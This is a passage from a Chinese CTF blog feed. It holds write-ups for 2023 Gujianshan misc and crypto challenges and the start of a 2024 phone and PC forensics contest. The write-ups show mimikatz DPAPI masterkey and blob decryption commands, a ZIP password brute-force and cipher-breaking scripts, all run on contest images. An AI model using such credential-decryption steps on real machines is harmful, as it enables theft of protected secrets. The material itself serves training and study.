src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012031203.png" alt="image-20240201203152737"></p><p>使用 mftparser 对内存中的 MFT 条目进行分析，并将结果保存至 mftparser.txt</p><pre><code>MFT（Master File Table）是NTFS文件系统中的一个重要概念，它是用来存储文件和目录元数据的数据结构。MFT条目（MFT entry）是MFT中的一个记录，每个文件或目录在MFT中都有一个对应的MFT条目。每个MFT条目包含了文件或目录的元数据信息，如文件名、文件大小、创建时间、修改时间等。MFT条目还包含了指向文件数据的指针，以及其他一些属性信息。MFT条目的结构可以分为两部分：固定长度部分和可变长度部分。固定长度部分包含了MFT条目的基本信息，如文件类型、标志位等。可变长度部分则包含了文件属性信息，如文件名、时间戳等。MFT条目在NTFS文件系统中起着非常重要的作用，它记录了文件和目录的元数据信息，使得文件系统能够有效地管理和访问文件。通过MFT条目，文件系统可以快速定位到文件的位置和属性信息，从而实现对文件的读取和操作。</code></pre><pre><code>.\volatility.exe -f E:\Desktop\比赛\古剑山\misc\[红明谷CTF2022]MissingFile\memory --profile=Win7SP1x86_23418 mftparser &gt;mftparser.txt</code></pre><p>在扫描文件的时候 找到了一个Hacker文件夹 我们在mftparser.txt里面继续找这个文件夹 找到了里面的<code>S3cret</code>文件  将其进行保存</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402082249091.png" alt="image-20240201203830998"></p><pre><code class="python">with  open(&#39;S3cert.txt&#39;,&#39;r&#39;) as f:    data = f.readlines()    for line in data:        new_line = line[12:60:1]        print(new_line)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012057793.png" alt="image-20240201205733741"></p><p>我们使用mimikatz检查一下<code>S3cert</code>文件</p><pre><code>privilege::debug dpapi::blob /in:./S3cert</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012102545.png" alt="image-20240201210221496"></p><p>找到masterkey的guid 在mftparser.txt里面找一下这个guid</p><pre><code>470a5148-d8c9-4453-bf41-f0c09d158bfd</code></pre><p>找到了masterkey文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012105859.png" alt="image-20240201210539783"></p><p>一样 将这个masterkey文件导出来 命名为<code>470a5148-d8c9-4453-bf41-f0c09d158bfd</code></p><p>下面就和幸运饼干的步骤一样了 先得到masterkey </p><pre><code>dpapi::masterkey /in:.\470a5148-d8c9-4453-bf41-f0c09d158bfd /sid:S-1-5-21-206512979-2006505507-2644814589-1001 /password:123456 /protected</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012111117.png" alt="image-20240201211142048"></p><pre><code>092c4220064c30bc7f8b15d2d48957c4926af0632149b9c08cd87f34fc43aa1204d775bdc6ab429a0d4d0826fb80b08250b125d92913e2f7578cf778073bfe38</code></pre><p>在解密<code>S3cert</code>文件</p><pre><code>dpapi::blob /in:.\S3cert /masterkey:092c4220064c30bc7f8b15d2d48957c4926af0632149b9c08cd87f34fc43aa1204d775bdc6ab429a0d4d0826fb80b08250b125d92913e2f7578cf778073bfe38 /unprotect</code></pre><p>得到16进制的明文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012140800.png" alt="image-20240201214002735"></p><p>解一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012140718.png" alt="image-20240201214035675"></p><h3 id="i-have-the-flag"><a href="#i-have-the-flag" class="headerlink" title="i_have_the_flag"></a>i_have_the_flag</h3><p>附件是一个js文件还有一个html文件 看一下html文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012019166.png" alt="image-20240201201933126"></p><p>随便测试一下  发现输入不同错误内容的时候 回显的内容不一样 也不像base64编码 那就转向分析js文件 看到一段关键代码</p><pre><code class="javascript">function ck(s) &#123;    try &#123;        ic    &#125; catch (e) &#123;        return;    &#125;    var a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54];    if (s.length == a.length) &#123;        for (i = 0; i &lt; s.length; i++) &#123;            if (a[i] - s.charCodeAt(i) != 3)                return ic = false;        &#125;        return ic = true;    &#125;    return ic = false;&#125;</code></pre><ul><li>该函数的目的是检查输入字符串是否满足特定条件，即字符串的每个字符的 ASCII 值与数组中对应位置的数字相差 3。</li><li>如果满足条件，函数返回 <code>true</code>，否则返回 <code>false</code>。</li></ul><p>很简单 我们直接将上面数组a的ascii码全部减三 在解ascii码就可以得到正确的key了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012359818.png" alt="image-20240201235958771"></p><pre><code>simpleedu123</code></pre><p>输入 就可以得到正确的值了 就是flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402020000443.png" alt="image-20240202000046406"></p><h3 id="jpginside"><a href="#jpginside" class="headerlink" title="jpginside"></a>jpginside</h3><p>附件是<code>jpginside.xxx</code>这样一个文件 不知道是什么类型的 用file命令看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402021204718.png"></p><p>是一个pyc文件 在线反编译一下</p><pre><code class="python">store = [    141,    183,    139,    129,    116,    117,    .....    49,    50]key = raw_input(&#39;Please input the key:&#39;)with open(&#39;excellent.jpg&#39;, &#39;wb&#39;) as jpg:    for i in range(len(store)):        jpg.write(chr(store[i] ^ ord(key[i % len(key)])))</code></pre><p>  先脚本恢复key 在上面的加密脚本里面用key加密的方式是对key的每一位循环使用 那我们只要取一部分明文和jpg图片格式里面相同的部分就可以恢复密钥 通过观察jpg图片结构 我们可以发现jpg的前13位都是一样的 那我们就选取这部分恢复我们的密钥</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402022347740.png" alt="image-20240202234745688"></p><pre><code class="python">encrypted_data = [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01]# 已知的加密后的数据store = [141, 183, 139, 129, 116, 117, 123, 116, 122, 114, 33, 115, 110]# 恢复密钥的过程key = &quot;&quot;for i in range(len(store)):    original_byte = store[i] ^ encrypted_data[i]    key += chr(original_byte)print(&quot;Recovered key:&quot;, key)</code></pre><p>得到结果是</p><pre><code>rotate1234!ro</code></pre><p>那按照前面说的密钥是按位循环使用 我们就取前11位就是完整密钥</p><pre><code>rotate1234!</code></pre><p>有了密钥我们直接利用上面的加密脚本 得到exllcent.jpg</p><pre><code class="python">store = [    141,    183,    139,    129,    116,    117,    .....    49,    50]key = rotate1234!with open(&#39;excellent.jpg&#39;, &#39;wb&#39;) as jpg:    for i in range(len(store)):        jpg.write(chr(store[i] ^ ord(key[i % len(key)])))</code></pre><p>注意这个脚本的运行欢迎是python2.7 python3运行可能会报错 </p><p>得到图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402082249587.png" alt="image-20240203000535700"></p><p>看文件结构发现尾部有一个压缩包 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402030010545.png" alt="image-20240203001001490"></p><p>分离出来发现crc有问题 修改为<code>504B</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402030010997.png" alt="image-20240203001035922"></p><p>正常解压  需要密码 猜测是前面的key 得到<code>jpek.txt</code></p><pre><code>jpek&#123;39i0jf49229fie5j33f02403hj953012&#125;</code></pre><p>随波逐流梭了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402030013607.png" alt="image-20240203001322559"></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere+++"></a>Vigenere+++</h3><pre><code class="python">import sysfrom secret_file  import *def _l(idx, s):    return s[idx:] + s[:idx]def main(p, k1, k2):    s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;    t = [[_l((i+j) % len(s), s) for j in range(len(s))] for i in range(len(s))]    i1 = 0    i2 = 0    c = &quot;&quot;    for a in p:        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]        i1 = (i1 + 1) % len(k1)        i2 = (i2 + 1) % len(k2)    return cflag=&quot;flag&#123;************************&#125;&quot;key=&quot;**********&quot;# * 为马赛克，长度为1。 # hint：  可以自己尝试下运行加密函数，看看秘钥对加密结果的影响。 # hint：  首先根据线索求秘钥，秘钥不唯一，找到一个有效的，就能爆破flag了。 print main(flag, key, key[::-1])# 程序运行结果（即密文为）:kY0awfsdlY1FFL8C3bi4GSYCF&#123;8W_E</code></pre><p>比较无脑 ctfwiki原题</p><p><a href="https://ctf-wiki.org/crypto/classical/summary/#_4">2017 SECCON Vigenere3d</a></p><pre><code class="python"># exp2.pyenc_str = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&#39;dec_dic = &#123;k:v for v,k in enumerate(enc_str)&#125;encrypt = &#39;kY0awfsdlY1FFL8C3bi4GSYCF&#123;8W_E&#39;flag_bg = &#39;flag&#123;**************************&#125;&#39;sim_key = [dec_dic[encrypt[i]]-dec_dic[flag_bg[i]] for i in range(5)] # 破解模拟密钥sim_key = sim_key + sim_key[::-1]flag_ed = [dec_dic[v]-sim_key[k%10] for k,v in enumerate(encrypt)] # 模拟密钥解密flag_ed = &#39;&#39;.join([enc_str[i%len(enc_str)] for i in flag_ed]) # 解码print(flag_ed)# flag&#123;kynFTW2PRdH9lCZBf8IKDe6U&#125;</code></pre><h3 id="guess-the-key"><a href="#guess-the-key" class="headerlink" title="guess_the_key"></a>guess_the_key</h3><p>给了一个main.c 是加密函数的代码 给了msg01是明文 msg01.enc、msg02.enc是密文 先看加密代码</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv) &#123;    if (argc != 3) &#123;        printf(&quot;USAGE: %s INPUT OUTPUT\n&quot;, argv[0]);        return 0;    &#125;    FILE* input  = fopen(argv[1], &quot;rb&quot;);    FILE* output = fopen(argv[2], &quot;wb&quot;);    if (!input || !output) &#123;        printf(&quot;Error\n&quot;);        return 0;    &#125;    char key[] = &quot;guessthekey&quot;;    char d, q, t = 0;    int ijk = 0;    while ((q = fgetc(input)) != EOF) &#123;        d = (q + (key[ijk % strlen( key )] ^ t) + ijk*ijk) &amp; 0xff;        t = q;        ijk++;        fputc(d, output);    &#125;    return 0;&#125;</code></pre><p>其实关键的一步就是d &#x3D; (q + (key[ijk % strlen( key )] ^ t) + ijk*ijk) &amp; 0xff;</p><p>d是密文[i] q是明文[i] key是密钥[i] t在经历一次循环之后就是明文[i-1] ijk就是一个单独的参数 在每一次循环结束之后都自加1  </p><p>由此我们利用明文msg.01和msg01.enc来破解出key </p><p>在这段加密代码中 key是每一位循环使用的 但对于前几位明文(不超过key的长度)来说 key[ijk % strlen( key ) 这一部分其实就是key[i] </p><p>我们可以利用爆破的方法 利用上面这个公式反推出q[i] &#x3D; d[i] - key[i]^q[i-1] - pow(ijk, 2) </p><p>我们使用循环遍历每一位key[i]的值 当出现满足q[i] &#x3D;&#x3D; text[i] (text是已知的明文)的key[i]时 我们就将这个key输出    下面是脚本</p><pre><code class="python">ciphertext = [0x9E,0x97,0x4B,0xD2,0x9A,0x8B,0xAD,0xA1,0x89,0x09,0xDE,0xAD,0x69,0x23,0x4E,0x76,0x70,0xAB,0xE4,0x97,0x44,0x22,0x81,0x8D,0x7F,0x22,0x23,0x70,0x7F,0xB5,0xFF,0x68,0x72,0xC1,0xC2,0x4B]text = &quot;Hi,there is nothing here,heiheihei.&quot;t = 0i = 0for p in ciphertext:        for key in range(31, 125):  # 这里表示的是key的ascii值            q = (p - (key ^ t) - i*i) &amp; 0xff            q = chr(q)  # 将q的ascii值转换为字符            try:                if q == text[i]:                    print(chr(key), end=&quot;&quot;)  # 将key的ascii值转换为字符输出                    t = ord(q)               # 将q的ascii值赋予t                    i += 1                    break            except:                 print(&#39;&#39;)                    # VeryVeryLongKeyYouWillNeverKnowVery</code></pre><p>我们可以看到key出现了循环的部分 那么正确的key就是<code>VeryVeryLongKeyYouWillNeverKnow</code></p><p>有了key  我们就可以继续写脚本获得msg02</p><pre><code class="python">msg02_enc = [0xA9,0x9F,0x83,0x45,0xEE,0x87,0x9B,0x6E,0x0E,0xC3,0xD4,0xE9,0xD5,0x61,0x36,0x81,0x70,0x96,0xD4,0xD7,0xF9,0xE4,0xC9,0x8C,0xD3,0xEA,0xDE,0xAC,0x7B,0xC5,0xA9,0x84,0x97,0xCB,0xB8,0xA8,0x8A,0x95,0x54,0x6D,0xBA,0xC0,0x7B,0xA0,0x06,0x68,0x9F,0x02,0xA8,0xCD,0x2A,0x52,0x49,0x91,0xE7,0x4A,0x71,0x6B,0xA8,0x1E,0x8E,0xBB,0xDC,0xED,0x7C,0x0B,0x5C,0x04,0x74,0x6B,0xBE,0x1C,0xC1,0x59,0xBC,0xAD,0x12,0xC2,0xFB,0xDA,0xEB,0x26,0xB1,0x61,0xED,0xE0,0x5D,0xF2,0xC8,0xA3,0x27,0xC5,0x96,0x58,0xAD,0xF5,0x8D,0x54,0x05,0xBC,0x47,0xAD,0x0C,0xE9,0xC0,0xAF,0x48,0x02,0x25,0x1E,0xC9,0xAB,0x6F,0x5B,0x37,0x30,0xBD,0x3A,0xC8,0xC7,0xCD,0xA0,0x4F,0xD9,0xBC,0x72,0x7E,0x84,0x53,0xB5,0x87,0x48,0xE5,0x8D,0x92,0xA9,0xC7,0xBC,0xEE,0x13,0x01,0xE7,0x5D,0x73,0x99,0x59,0x29,0xDC,0x1A,0xEF,0xA6,0xBB,0xB6,0xFD,0x12,0x86,0x82,0x7E,0x4C,0x6F,0x84,0xBA,0xF7,0x52,0x80,0x92,0x0D,0xB0,0xD9,0x07,0x40,0xF3,0x17,0x95,0xAF,0xC9,0xBB,0xE8,0xE7,0xF1,0x08,0x75,0xF4,0xF1,0x03,0x1C,0xC3,0x11,0x36,0x49,0xAA,0x04,0x69,0xF7,0xA0,0xC5,0xCD,0x17,0xC6,0x23,0x6B,0xBE,0xE7,0x7B,0xE2,0xE6,0x4B,0xD4,0x5E,0x55,0xC3,0x0C,0x54,0xD3,0x5C,0x05,0x79,0xCE,0x1B,0xD4,0x91,0x50,0xF6,0xB4,0x36,0x41,0x46,0xD5,0x38,0xB1,0x21,0xE0,0xE2,0x38,0xA2,0x65,0xB7,0x16,0x71,0xF7,0x82,0x56,0x4D,0x22,0xE2,0x3B,0xEE,0x89,0x1E,0xA7,0xB3,0x46,0xFA,0x82,0x83,0x3D,0xB1,0x8C,0x85,0x92,0xB7,0x52,0x99,0x13,0xBA,0x72,0x43,0xDB,0x10,0xE8,0xA0,0x5B,0x39,0xDA,0xB3,0xF8,0xF8,0xE3,0xAF,0xA2,0x6A,0x29,0x2F,0x82,0x91,0x6E,0x41,0x58,0x77,0xC8,0xAD,0xA8,0x89,0xCF,0x00,0xB3,0xB6,0x27,0x5F,0xC6,0xD6,0xAF,0xB3,0x1C,0x6B,0xF1,0x25,0xB8,0x20,0xA0,0xD1,0x89,0xBA,0x04,0xF9,0xD5,0x8E,0x0B,0xB0,0x10,0x8B,0x37,0x99,0xBC,0xBA,0x05,0xB3,0x58,0xA3,0x5C,0xF4,0x86,0x43,0xEA,0x08,0x1D,0x79,0xFE,0x1B,0x05]key = &#39;VeryVeryLongKeyYouWillNeverKnow&#39;msg02 = &#39;&#39;t = 0for i in range(len(msg02_enc)):     if i ==0:        q = chr((msg02_enc[i] - (ord(key[i % len(key)]) ^ 0) - pow(i, 2)) &amp; 0xff)     else:        q = chr((msg02_enc[i] - (ord(key[i % len(key)]) ^ ord(t)) - pow(i, 2)) &amp; 0xff)     t = q     msg02 += qprint(msg02)# She had been shopping with her Mom in Wal-Mart. She must have been 6 years old, this beautiful brown haired, freckle-faced image of innocence. It was pouring outside. The kind of rain that gushes over the top of rain gutters, so much in a hurry to hit the Earth, it has no time to flow down the spout.flag&#123;101a6ec9f938885df0a44f20458d2eb4&#125;</code></pre><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><pre><code>p=165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977q=120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731e=33c=10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919</code></pre><p>上面就是我们能拿到的数据</p><p>看yolo师傅的博客学到是  有限域内开方 <a href="https://hucongting.com/2023/10/19/RSA%E4%B8%ADe%E5%92%8Cphi%E4%B8%8D%E4%BA%92%E7%B4%A0%E9%97%AE%E9%A2%98/">RSA中e和phi不互素问题</a></p><pre><code class="python">from Crypto.Util.number import *p=165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977q=120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731e=33c=10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919n = p*qP.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=&#39;NTL&#39;)f=a^e-cmps=f.monic().roots()P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=&#39;NTL&#39;)g=a^e-cmqs=g.monic().roots()flag=[]for mpp in mps:    x=mpp[0]    for mqq in mqs:        y=mqq[0]        solution = CRT_list([int(x), int(y)], [p, q])        flag.append(solution)for i in flag:    m=long_to_bytes(i)    if b&#39;flag&#39;in m:        print(m)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402082248969.png" alt="image-20240208224859887"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023古剑山&quot;&gt;&lt;a href=&quot;#2023古剑山&quot; class=&quot;headerlink&quot; title=&quot;2023古剑山&quot;&gt;&lt;/a&gt;2023古剑山&lt;/h1&gt;&lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="crypto" scheme="http://w3nx1z1.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2024獬豸杯</title>
    <link href="http://w3nx1z1.github.io/2024/01/30/2024%E7%8D%AC%E8%B1%B8%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/01/30/2024%E7%8D%AC%E8%B1%B8%E6%9D%AF/</id>
    <published>2024-01-29T16:15:37.932Z</published>
    <updated>2024-02-01T04:52:50.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024獬豸杯"><a href="#2024獬豸杯" class="headerlink" title="2024獬豸杯"></a>2024獬豸杯</h1><h2 id="手机备份包"><a href="#手机备份包" class="headerlink" title="手机备份包"></a>手机备份包</h2><h3 id="手机基本信息"><a href="#手机基本信息" class="headerlink" title="手机基本信息"></a>手机基本信息</h3><h4 id="1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20-12-12-12"><a href="#1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20-12-12-12" class="headerlink" title="1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20.12:12:12)"></a>1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20.12:12:12)</h4><pre><code>2024-01-15.14:19:44</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291605828.png" alt="image-20240129160542802"></p><p>文件名就是备份时间 也可以从<code>\IOS备份\2024年01月15日_14时19分44秒_iPhone\log.txt</code>里面看到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291657598.png" alt="image-20240129165751567"></p><h4 id="2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）"><a href="#2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）" class="headerlink" title="2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）"></a>2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）</h4><pre><code>2</code></pre><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282139544.png" alt="image-20240128213900524"></p><h4 id="3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）"><a href="#3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）" class="headerlink" title="3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）"></a>3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）</h4><pre><code>89860320245121150689</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282139301.png" alt="image-20240128213922267"></p><h4 id="4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）"><a href="#4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）" class="headerlink" title="4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）"></a>4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）</h4><pre><code>20240115</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282145766.png" alt="image-20240128214539725"></p><h3 id="地图数据"><a href="#地图数据" class="headerlink" title="地图数据"></a>地图数据</h3><h4 id="5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）"><a href="#5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）" class="headerlink" title="5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）"></a>5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）</h4><pre><code>天铂华庭</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282147290.png" alt="image-20240128214759225"></p><h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><h4 id="1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie-db"><a href="#1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie-db" class="headerlink" title="1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie.db)"></a>1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie.db)</h4><pre><code>Bookmarks.db</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282149182.png" alt="image-20240128214929128"></p><h4 id="2、手机机主计划去哪里旅游。（标准格式：苏州"><a href="#2、手机机主计划去哪里旅游。（标准格式：苏州" class="headerlink" title="2、手机机主计划去哪里旅游。（标准格式：苏州)"></a>2、手机机主计划去哪里旅游。（标准格式：苏州)</h4><pre><code>拉萨</code></pre><p>火眼分析不出来safari的搜索记录 可以直接从源文件翻数据库 路径为</p><pre><code>2024年01月15日_14时19分44秒_iPhone/文件系统/2024年01月15日_14时19分44秒_iPhone.tar/AppDomain-com.apple.mobilesafari/Library/Preferences/com.apple.mobilesafari.plist</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282248530.png" alt="image-20240128224856438"></p><p>或者是使用AXIOM分析苹果手机备份 可以分析出safari的搜索记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282252719.png" alt="image-20240128225254615"></p><h3 id="即时通讯"><a href="#即时通讯" class="headerlink" title="即时通讯"></a>即时通讯</h3><h4 id="1、手机机主查询过那个人的身份信息。（标准格式：龙信）"><a href="#1、手机机主查询过那个人的身份信息。（标准格式：龙信）" class="headerlink" title="1、手机机主查询过那个人的身份信息。（标准格式：龙信）"></a>1、手机机主查询过那个人的身份信息。（标准格式：龙信）</h4><pre><code>龙黑</code></pre><p>老样子从小西米语音的聊天信息数据库里面找找东西 最近这个考点已经出现很多次了 数据库默认名称为<code>im5db</code> 提取出来 在navicat里面看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291955563.png" alt="image-20240129195518516"></p><h4 id="2、请问机主共转多少费用用于数据查询。（标准格式：1000）"><a href="#2、请问机主共转多少费用用于数据查询。（标准格式：1000）" class="headerlink" title="2、请问机主共转多少费用用于数据查询。（标准格式：1000）"></a>2、请问机主共转多少费用用于数据查询。（标准格式：1000）</h4><pre><code>1100</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291956605.png" alt="image-20240129195607582"></p><h4 id="3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）"><a href="#3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）" class="headerlink" title="3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）"></a>3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）</h4><pre><code>3</code></pre><p>从苹果手机备份里面的图片里面找到一张嫌疑人查询的10个数据的截图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291958449.png" alt="image-20240129195849411"></p><p>我们通过身份证号判断性别</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401292000506.png" alt="image-20240129200006479"></p><p>前8个里面有4个男性 但是王也的月份是14月 所以不算 最后面两个身份证不全或者不是身份证 无法判断性别 故不做判断 所以一共有三个男性</p><h2 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h2><p>直接分析计算机是分析不出来邮件的 我们需要解一下bitlocker 刚开始我是想找密钥文件来着 在计算机镜像里面有一个文件名交</p><pre><code>BitLocker 恢复密钥 60F74055-7745-439B-四位数字-FF4101D98050</code></pre><p>还去搞了半天掩码爆破 后面看到苹果手机备份里面直接找到bitlocker的密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282322424.png" alt="image-20240128232249370"></p><p>直接在火眼和取证大师里面就可以解bitlocker进行分析了</p><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><h4 id="1、计算机系统的安装日期是什么时候。（标准格式：20240120）"><a href="#1、计算机系统的安装日期是什么时候。（标准格式：20240120）" class="headerlink" title="1、计算机系统的安装日期是什么时候。（标准格式：20240120）"></a>1、计算机系统的安装日期是什么时候。（标准格式：20240120）</h4><pre><code>20240112</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282255635.png" alt="image-20240128225536600"></p><h3 id="系统痕迹"><a href="#系统痕迹" class="headerlink" title="系统痕迹"></a>系统痕迹</h3><h4 id="1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1-zip）"><a href="#1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1-zip）" class="headerlink" title="1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1.zip）"></a>1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1.zip）</h4><pre><code>data.zip</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282256977.png" alt="image-20240128225650910"></p><h3 id="数据库分析"><a href="#数据库分析" class="headerlink" title="数据库分析"></a>数据库分析</h3><h4 id="1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20-12-12-12"><a href="#1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20-12-12-12" class="headerlink" title="1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20.12:12:12)"></a>1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20.12:12:12)</h4><p>解开bitlocker后 我们分析邮件内容 看到<code>2042@longxin.com</code>和<code>xiaohei@longxin.com</code>的邮件记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291128216.png" alt="image-20240129112850171"></p><p>里面提到了哈希值为<code>84fa25f20046ffd2c43991d9212bba96</code>的文件 在上一题中提到的最近访问的压缩包文件<code>data.zip</code>的哈希值就是这个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291205220.png" alt="image-20240129120504177"></p><p>在邮件记录中还提到了密码是尾号为555的手机号 我们将其提取出来使用掩码爆破 很快就爆破出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291207751.png" alt="image-20240129120715680"></p><p>密码为<code>15566666555</code> 将其进行解压得到数据库文件 直接用火眼的数据库分析工具进行分析 在mysql数据库的user表中找到password_last_changed字段  就是最后一次修改密码的时间 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291720796.png" 